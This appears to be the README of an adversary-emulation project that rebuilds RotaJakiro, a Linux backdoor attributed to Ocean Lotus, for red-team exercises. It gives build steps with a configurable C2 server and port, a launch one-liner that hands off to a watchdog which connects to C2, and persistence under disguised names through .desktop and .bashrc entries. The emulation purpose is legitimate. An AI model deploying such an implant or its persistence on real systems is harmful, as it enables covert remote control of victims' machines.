## Rota
[RotaJakiro](https://blog.netlab.360.com/stealth_rotajakiro_backdoor_en/)(Rota) is the Linux implant believed to be leveraged by Ocean Lotus. This repo contains the code to emulate the Linux implant based on threat reports listed in the references section below along with reverse engineering efforts by the ATT&CK team.

## Requirements
* Make
* gcc

## For Operators
### Execution
Upon building the artifact, execute the following command to start rota. The following command will create the persistence locations, and copy rota to the appropriate locations on the file system. By killing the "rota-release" initial binary, the watchdog process will then spawn the follow on proceses and connect to the C2 server.

``` sh
nohup ./rota-release&2>/dev/null; sleep 5; pkill rota-release
```


For the emulation plan, place the built version of Rota in the payloads directory with a name of "rota". Assuming the Ocean Lotus git repository is in your home directory, the following command can be executed:
```
cp rota-release ~/ocean-lotus/Resources/payloads/rota
cp so_mount.so ~/ocean-lotus/Resources/payloads/somount.so
cp so_pdf.so ~/ocean-lotus/Resources/payloads/sopdf.so
```

## For Developers
### Building
1. Modify Makefile to specify C2 server and C2 port

``` sh
#update Makefile here
C2_SERVER='"10.10.2.228"'
C2_PORT=1443
```

2. Run make to build release/debug executables and an example shared objection for exeuction

``` sh
$> make all
```

* Buidling with Docker (optional)
A Dockerfile is also provided to install a build environment and produce a rota executable. Since Rota is a dynamically compiled ELF binary, this ensure no glibc issues during execution.

``` sh
$> docker build . -t attack:rota; # build the container image
$> docker run --name rota attack:rota; # run the container image to produce the ELF executable
$> docker cp rota:/opt/bins/rota-release .; # copy rota to local directory
$> docker cp rota:/opt/bins/so_pdf.so .; # copy rota to local directory
$> docker cp rota:/opt/bins/so_mount.so .; # copy rota to local directory
```

Now that you have a built version of rota, follow the documentation in the Emulation plan to copy it to the destintion folder.

### Troubleshooting Docker Builds

If you've already executed a container with the name of "rota", an error similar to the one shown below will be displayed.
``` sh
docker: Error response from daemon: Conflict. The container name "/rota" is already in use by container "7d5835315af678be4499b816b20b137cd76f77987c81c18c50df70a4b819a206". You have to remove (or rename) that container to be able to reuse that name.
See 'docker run --help'.
```

To fix this, either change the name of the container you're running via:

``` sh
$> docker run --name rota2 attack:rota;
```

Or remove the old stopped container via:

``` sh
$> docker rm rota;
```

## Host Artifacts

## Persistence Overview
Upon initial launch of Rota, the binary checks whether or not its running as root, and then takes persistence actions baesd on this result. Non-root execution results in the rota binary being copied to ```$HOME/.gvfsd/profile/gvfsd-helper``` and ```$HOME/.dbus/.sessions/session-dbus```.
Corresponding lock files are also created which prevent's Rota from continously spawning (TODO: Netlab 360 citation here).

Non-root persistence is achieved via a modified ```.Desktop``` file (TODO: TID HERE) along with adding an entry to ```.bashrc```(TODO: TID HERE) which spawns ```gvfsd-helper``` on boot. (TODO: Netlab 360 citation here).

## IPC Overview

During execution, ```gvfsd-helper``` creates shared memory to communicate its pid to another RotaJakiro process, "```session-dbus```". Each process writes its pid to this shared memory location to ensure the other process will re-spawn it, should the process die. This "alive check" is achieved via checking for PID entries within ```/proc/```. If no entry exists, the surviving process will respawn the other.

### IPC Syscalls Explained

The RotaJakiro reports specify the use of shared memory via [POSIX Shared Memory functions](https://man7.org/linux/man-pages/man7/shm_overview.7.html). 
The implementation of Rotajakiro within this repo hereby referred to as "rota", uses ```shmget``` to create a key of ```0x64b2e2```with a memory allocation of 8 bytes.
This key and associated function ```shmget``` were chosen from reverse engineering RotaJakiro sample [0958e1f4c3d14e4de380bda4c5648ab4fa4459ef8f5daaf32bb5f3420217af32](https://www.virustotal.com/gui/file/0958e1f4c3d14e4de380bda4c5648ab4fa4459ef8f5daaf32bb5f3420217af32).
Notably, this function call **does not** create a file within ```/dev/shm/``` whereas ```shm_open``` does.  This limits the presence of additional file artifacts for DFIR professionals.

The function below demonstrates the creation of shared memory with the result being stored in variable shmid.

``` sh
int shmid = shmget(0x64b2e2, 8, IPC_CREAT | 0666);
```

The [ipcs](https://man7.org/linux/man-pages/man1/ipcs.1.html) utility can be used to inspect that the shared memory has been appropriately created.

```
$> ipcs

------ Shared Memory Segments --------
key        shmid      owner      perms      bytes      nattch     status
0x00000000 8          gdev       600        524288     2          dest
0x00000000 16         gdev       600        524288     2          dest
0x0064b2e2 20         gdev       666        8          0
```

To manually remove this key, execute the following command:

``` sh
ipcrm -M 0x0064b2e2
```

The 8 bytes created by ```shmget``` are then used to store both the main C2 process of Rotajakiro "```gvfsd-helper```" and the supplemental watch dog process "```session-dbus```".
The first four bytes store the process id belonging to ```gvfsd-helper```, and the last four store ```session-dbus```'s process id.

``` sh
[ gvfsd-pid ][ session-dbus ] // 8 bytes of memory
```


## References
* [RotaJakiro: A long lived secret backdoor with 0 VT detection](https://blog.netlab.360.com/stealth_rotajakiro_backdoor_en/)
* [RotaJakiro, The Linux version of Ocean Lotus](https://blog.netlab.360.com/rotajakiro_linux_version_of_oceanlotus/)
* [The New and Improved macOS Backdoor from Ocean Lotus](https://unit42.paloaltonetworks.com/unit42-new-improved-macos-backdoor-oceanlotus/)
